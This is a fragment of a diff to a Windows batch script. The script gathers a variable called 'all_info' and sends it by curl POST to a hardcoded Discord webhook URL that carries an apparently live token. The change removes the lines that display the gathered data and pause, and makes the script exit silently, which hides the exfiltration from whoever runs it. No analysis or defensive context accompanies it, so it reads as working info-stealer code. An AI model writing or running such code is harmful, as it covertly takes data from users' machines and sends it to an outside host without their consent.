@@ -29,5 +29,4 @@ set "all_info=!all_info:"=\\"!"
 set "all_info=!all_info:^!=^^!"
 set "webhook=https://discord.com/api/webhooks/1331746234913787968/LEOrippG4WTHjQPVUOr4O1KhcP_vZ0FdUY92Kaojq0MqTTFlYr-zqkM7Ud39cPd5yJWP"
 curl -X POST -H "Content-type: application/json" --data "{\"content\":\"%all_info%\"}" %webhook%
-echo !all_info!
-pause
+exit
